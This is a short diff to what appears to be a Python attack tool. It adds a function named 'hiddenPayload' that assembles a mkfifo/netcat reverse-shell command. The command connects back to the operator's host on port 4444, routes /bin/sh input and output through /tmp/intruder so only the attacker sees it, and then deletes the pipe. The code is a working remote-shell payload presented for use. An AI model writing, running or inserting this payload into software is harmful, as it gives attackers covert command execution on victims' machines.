@@ -36,3 +36,21 @@ def readOutput(sock):
 
     # Return the data that was read
     return sock.recv(length) if length else b""
+
+def hiddenPayload(lhost):
+    
+    # pipe is used to create a pipe called /tmp/intruder, this will allow for data to be passed between processes
+    pipe = 'mkfifo /tmp/intruder; '
+
+    # Creates a connection to our machine and reads input from the /tmp/intruder file
+    ncSetup = f'nc {lhost} 4444 0</tmp/intruder '
+
+    # starts a shell on the targeted mahine and redirect input and output from /bin/sh to /tmp/intruder so that only we see what is being executed
+    shellSetup = '| /bin/sh >/tmp/intruder 2>&1; '
+
+    # removes the folder after the payload has been executed
+    cleanup = 'rm /tmp/intruder'
+
+    payload = f"{pipe}{ncSetup}{shellSetup}{cleanup}"
+    
+    return payload 
